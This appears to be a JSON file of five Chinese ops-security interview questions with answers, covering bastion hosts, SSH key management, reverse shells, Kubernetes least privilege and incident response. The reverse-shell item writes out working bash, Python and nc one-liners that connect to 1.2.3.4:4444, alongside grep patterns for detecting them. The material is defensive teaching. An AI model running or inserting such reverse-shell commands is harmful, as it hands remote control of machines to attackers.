@@ -1,0 +1,42 @@
+[
+  {
+    "id": 5200,
+    "type": "short",
+    "category": "安全与跳板机",
+    "difficulty": "简单",
+    "question": "跳板机（堡垒机）的作用是什么？为什么生产环境必须经过它？",
+    "answer": "**核心作用：把「直接访问生产」变成「经过审计的代理访问」。**\n\n**四个不可替代的价值**：\n\n| 价值 | 说明 |\n|---|---|\n| **统一入口** | 生产服务器只允许跳板机 IP 访问，其余一律拒绝 |\n| **身份集中** | 人员在跳板机上鉴权，不需要在每台机器上开账号 |\n| **操作审计** | 所有输入命令、回放录像、文件传输**全程记录** |\n| **权限控制** | 按人/组/主机授予不同权限，可临时授权、可即时回收 |\n\n**没有跳板机的现状（几乎所有事故的共性）**：\n```\n✗ 每个人本地都有私钥，能直连所有机器\n✗ 服务器上有几十个个人账号，走了人也没人清理\n✗ 出了事查不到「谁在什么时候做了什么」\n✗ 权限无法回收（私钥已经发出去了）\n```\n\n**典型架构**：\n```\n工程师 → 跳板机（跳跃服务器/堡垒机）→ 生产服务器\n         ├─ 双因素认证（2FA）\n         ├─ 命令审计与录像\n         ├─ 危险命令拦截（rm -rf /、dd）\n         └─ 权限矩阵（谁能登哪些机器）\n```\n\n**主流方案**：\n\n| 方案 | 特点 |\n|---|---|\n| **Jumpserver** | 开源，国内最流行，Web 界面 + 录像回放 |\n| **Teleport** | 现代化，支持 SSH/K8s/DB 统一接入 |\n| **云厂商堡垒机** | 阿里云/腾讯云，开箱即用 |\n| **自建 SSH 跳板** | 最简，只有 `ProxyJump`，无审计 |\n\n**自建最简版（仅跳转，无审计）**：\n```\n# ~/.ssh/config\nHost prod-*\n    ProxyJump bastion.example.com\nHost bastion.example.com\n    HostName 1.2.3.4\n    User ops\n```\n**这只是「跳转」，不是「堡垒机」**——没有审计就没有核心价值。\n\n**关键设计原则**：\n1. **生产服务器不暴露公网 SSH 端口**（安全组只允许跳板机）\n2. **跳板机本身要加固**（它是最高价值的攻击目标）\n3. **跳板机不存业务数据**，只做通道\n4. **双因素认证必须开**（密码/密钥 + TOTP/短信）\n5. **有「紧急通道」预案**（跳板机挂了怎么办）"
+  },
+  {
+    "id": 5201,
+    "type": "short",
+    "category": "安全与跳板机",
+    "difficulty": "中等",
+    "question": "SSH 密钥怎么管理？为什么「把私钥发给每个人」是错的？",
+    "answer": "**核心问题：私钥一旦分发出去，就永远无法真正回收。**\n\n**「分发私钥」的四个致命问题**：\n\n1. **无法吊销**：人离职了、笔记本丢了，只要不换密钥就能继续登\n2. **无法审计到人**：所有人用同一个密钥，日志里都是同一个用户\n3. **无法限制范围**：一把私钥能登所有机器，违背最小权限\n4. **容易泄漏**：私钥常被复制到 U 盘、网盘、Git 仓库\n\n**正确做法（按成熟度递增）**：\n\n**1. 每人一对密钥（最低要求）**\n```\nssh-keygen -t ed25519 -C \"alice@company\"\n# 公钥加到目标机器的 authorized_keys，附带限制\n```\n在 `authorized_keys` 里可以加限制：\n```\nfrom=\"10.0.0.0/8\" command=\"/usr/local/bin/restricted\" ssh-ed25519 AAAA... alice\n```\n\n**2. 密钥 + 跳板机（推荐）**\n```\n用户的密钥只能登跳板机；跳板机持有到生产机器的密钥\n→ 生产机器上不存任何个人公钥\n```\n**这样「回收权限」只需在跳板机上关账号**，一次操作生效。\n\n**3. 证书认证（最成熟，SSH CA）**\n```\n# 用 CA 给用户签发短期证书（如 8 小时有效）\nssh-keygen -s ca_key -I alice -n alice -V +8h alice.pub\n# 服务器信任 CA 的公钥（TrustedUserCAKeys）\n```\n**优势**：①证书**自动过期**，不需要手动回收；②权限（登录名、有效期、来源 IP）**编码在证书里**；③审计能精确到人。\n\n**4. 短期凭据（云原生方案）**\n```\nAWS SSM Session Manager / GCP IAP / 阿里云 Session Manager\n→ 不需要开放 SSH 端口，凭据是短期的 IAM 令牌\n```\n\n**私钥的存放要求**：\n```\nchmod 600 ~/.ssh/id_ed25519       # 权限必须 600\npassphrase 必须设（至少对能登生产的）\n不要放在同步盘（Dropbox/iCloud）\n不要在 CI 里以文件形式长期保存\n```\n\n**公钥的集中管理**：\n```\n✓ 用配置管理（Ansible）统一分发 authorized_keys\n✓ 或用 LDAP/SSO + 自动同步\n✗ 手工登录每台机器追加（迟早不一致）\n```\n\n**一句话**：**「人持有只能进跳板机的凭证」+「跳板机集中管理到生产的凭证」是成本最低的正确做法；再往上就是短期证书。**"
+  },
+  {
+    "id": 5202,
+    "type": "short",
+    "category": "安全与跳板机",
+    "difficulty": "中等",
+    "question": "什么是「反弹 shell」？如何发现和防御？",
+    "answer": "**反弹 shell = 目标机器主动连出去，把 shell 交给攻击者。**\n\n**为什么用反弹而不是正向连接**：\n```\n正向（攻击者连目标）：目标可能没公网 IP、入口被防火墙挡\n反弹（目标连攻击者）：目标通常可以出网（HTTP/DNS），出站限制少\n```\n\n**常见形式**：\n```bash\n# bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n\n# python\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# nc\nnc -e /bin/sh 1.2.3.4 4444\n\n# perl / ruby / php / socat 都有对应写法\n```\n\n**发现的四个线索**：\n\n**1. 异常外联**（最可靠）\n```\nss -antp | grep ESTAB        # 看有没有可疑的境外 IP、非常见端口\nlsof -i -n -P | grep -i estab\n```\n\n**2. 异常进程**\n```\nps aux | grep -E 'bash -i|nc -e|socat|python3 -c'\n# 排查父进程异常的 shell\npstree -p | grep -A3 sh\n```\n\n**3. 异常定时任务**（持久化）\n```\ncrontab -l; ls -la /etc/cron*; systemctl list-timers\n```\n\n**4. 网络流量监控**\n```\ntcpdump -i any -n 'tcp[tcpflags] & tcp-syn != 0 and not port 80 and not port 443'\n# 或用 netstat 的告警规则（Prometheus 监控非常见端口的出站连接）\n```\n\n**防御手段**：\n\n| 层次 | 措施 |\n|---|---|\n| **网络层** | **出站白名单**——只允许访问已知目标（反向思路，效果最好） |\n| **主机层** | 限制普通用户的出站连接能力（iptables owner 模块） |\n| **审计层** | 记录所有 `bash -i`、`nc -e`、`/dev/tcp` 使用 |\n| **检测层** | EDR/HIDS（如 Falco）监控异常 exec 与网络行为 |\n\n**出站白名单是最有效的**：\n```\n默认拒绝所有出站，只放行必要的（内网服务、yum 源、NTP）\n→ 反弹 shell 连不出去，攻击者拿到 shell 也用不了\n```\n**这是唯一能从根本上限制「拿了 shell 也没用」的手段。**\n\n**应急顺序**：**先隔离网络（不关机、不重启）→ 取证（内存、进程、文件）→ 再清理**。直接重启会丢失所有证据。"
+  },
+  {
+    "id": 5203,
+    "type": "short",
+    "category": "安全与跳板机",
+    "difficulty": "中等",
+    "question": "「最小权限原则」在容器与 K8s 环境怎么落地？",
+    "answer": "**容器默认是「很宽松」的，必须主动收紧。**\n\n**七个具体措施**：\n\n**1. 不以 root 运行**\n```yaml\nsecurityContext:\n  runAsNonRoot: true\n  runAsUser: 1000\n  allowPrivilegeEscalation: false\n```\n**Dockerfile 里就要设**：`USER 1000`（很多镜像默认 root）。\n\n**2. 丢弃 capabilities**\n```yaml\nsecurityContext:\n  capabilities:\n    drop: [ALL]\n    add: [NET_BIND_SERVICE]     # 只加真正需要的\n```\n`privileged: true` 是**反面**——几乎等于宿主机 root。\n\n**3. 只读根文件系统**\n```yaml\nsecurityContext:\n  readOnlyRootFilesystem: true\n# 需要写的目录单独挂 emptyDir\nvolumeMounts:\n- { name: tmp, mountPath: /tmp }\n```\n\n**4. 不用 hostPath / hostNetwork**\n```\nhostPath 能读写宿主机文件（提权路径）\nhostNetwork 绕过网络隔离\n→ 除非 CNI/监控 agent 这类必须的，一律禁止\n```\n\n**5. ServiceAccount 最小化**\n```yaml\nautomountServiceAccountToken: false    # 不需要访问 apiserver 就关掉\n```\n**用 RBAC 精确到 verb + resource**，不要给 `cluster-admin`。\n\n**6. Pod Security Admission（PSA）**\n```yaml\napiVersion: v1\nkind: Namespace\nmetadata:\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n```\n三档：`privileged`（无限制）/ `baseline`（禁止明显危险项）/ **`restricted`（最严格，推荐生产）**。\n\n**7. 镜像与供应链**\n```\n- 只用私有仓库的可信镜像\n- 固定 digest 而非 tag\n- 扫描漏洞（Trivy）\n- 非 root 基础镜像（distroless / alpine + USER）\n```\n\n**验证手段**：\n```\nkubectl auth can-i --list --as=system:serviceaccount:ns:sa-name\nkubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.securityContext}{{\"\\n\"}}{end}'\n```\n\n**最常见的「违规」**：\n1. **CI/CD 的 deploy SA 是 cluster-admin**（一个 SA 能改全集群）\n2. **监控/日志 agent 用 hostPath 挂整个 `/var/lib`**\n3. **业务容器以 root 跑且没设 `runAsNonRoot`**\n\n**一句话**：**容器的「最小权限」从「非 root + drop capabilities + 只读根」这三条开始，能挡掉绝大多数提权路径。**"
+  },
+  {
+    "id": 5204,
+    "type": "short",
+    "category": "安全与跳板机",
+    "difficulty": "困难",
+    "question": "发现服务器 CPU 异常高、有陌生进程，如何做「应急响应」？顺序很重要。",
+    "answer": "**核心原则：先隔离，再取证，最后清理。绝不能先重启。**\n\n**错误的做法（会把证据全毁掉）**：\n```\n✗ 直接 reboot（内存里所有证据消失）\n✗ 直接 kill 陌生进程（攻击者知道你发现了，会换手段）\n✗ 直接删可疑文件（无法做后续分析）\n```\n\n**正确的六步**：\n\n**Step 1：网络隔离（最先做）**\n```\n# 保留跳板机/管理通道，切断业务与互联网\n# 云上：改安全组，只留管理 IP\n# 物理机：iptables 限制出站\n```\n**目的**：阻止横向移动和数据外传，同时**保住现场**。\n\n**Step 2：保存内存现场（重启前唯一的机会）**\n```\n# 内存镜像（能查进程、连接、凭据）\n# 或用简单方式先记录关键信息\nps auxf > /evidence/ps.txt\nss -antp > /evidence/ss.txt\nlsof -i -n -P > /evidence/lsof.txt\ncat /proc/*/cmdline | tr '\\0' ' ' > /evidence/cmdline.txt\nhistory / ~/.bash_history 备份\n```\n\n**Step 3：定位异常**\n```\n# 1. 谁在吃 CPU\ntop -H -b -n1 | head -30\n# 2. 进程树（看父进程是否异常）\npstree -p <pid>\n# 3. 可执行文件路径（可能已被删除但仍在运行）\nls -l /proc/<pid>/exe\n# 4. 网络连接\nss -antp | grep <pid>\n# 5. 持久化机制（攻击者最爱）\ncrontab -l; cat /etc/cron*/*; systemctl list-units --type=service\nls -la /etc/ld.so.preload      # 用户态 rootkit 常见位置\n```\n\n**Step 4：横向排查（是否已被扩散）**\n```\n- 检查 SSH 登录日志：last、/var/log/auth.log、~/.ssh/authorized_keys 有无新增\n- 检查同网段其他机器是否有相同异常\n- 检查是否有新的用户账号（uid 0 或可登录的）\n```\n\n**Step 5：处置**\n```\n# 确认为恶意后：\n1. 保留副本（复制到隔离机器再分析）\n2. 删除恶意文件、清理 cron/systemd 后门\n3. 重置所有可能泄漏的凭据（SSH key、DB 密码、云 AK）\n4. 从可信镜像重建机器（比「清理」更彻底）\n```\n**强烈建议「重建」而不是「清理」**——清理总会漏掉东西。\n\n**Step 6：复盘与加固**\n```\n- 入口是什么？（弱密码、过期漏洞、泄漏的密钥）\n- 为什么不早发现？（监控缺口）\n- 影响范围与数据是否外泄（要评估合规责任）\n```\n\n**关键判断：是「真入侵」还是「误报」**：\n```\n容易被误判的正常现象：\n- 挖矿木马 vs 正常的大数据/编译任务\n- 合法运维脚本 vs 恶意 cron\n- 正常的出站连接 vs 反弹 shell\n\n判断依据：文件路径是否合理（/tmp 下的二进制可疑）、\n         是否有对应的变更记录、\n         进程的启动方式与父进程\n```\n\n**最容易被忽略的一条**：**保留证据链**。如果要追责或走司法流程，取证过程要有记录（谁在什么时候做了什么），否则证据不可用。"
+  }
+]
